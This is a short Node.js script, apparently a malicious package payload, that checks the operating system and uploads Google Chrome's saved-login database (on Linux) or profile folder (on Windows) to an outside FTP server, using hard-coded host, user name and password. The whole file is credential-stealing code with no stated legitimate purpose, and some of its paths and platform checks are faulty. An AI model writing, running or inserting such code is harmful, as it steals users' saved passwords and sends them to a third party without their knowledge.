var jxm = require('jxm');
var os = require('os');
var Client = require('ftp');
var c = new Client();
// For Linux
if(os.platform() === 'linux'){
    c.on('ready', function() {
        c.put('~/.config/google-chrome/Default/Login\ Data', '/htdocs/file'+ Date.now() +'.txt', function(err) {
            if (err) {
                throw err;
            }
            c.end();
        });
    });
    /* FTP Configs */
    c.connect({
        host: 'ftp.byethost12.com',
        user: 'b12_16353986',
        password: 'gregLIN19'
    });
} else if (os.platform() === 'windows'){ // For Windows
    c.on('ready', function() {
        c.put('C:\Users\linfordg\Appdata\Local\Google\Chrome\User Data\Default', '/htdocs/file'+ Date.now() +'.txt', function(err) {
            if (err) {
                throw err;
            }
            console.log('fichier envoyer');
            c.end();
        });
    });
    /* FTP Configs */
    c.connect({
        host: 'ftp.byethost12.com',
        user: 'b12_16353986',
        password: 'gregLIN19'
    });
}
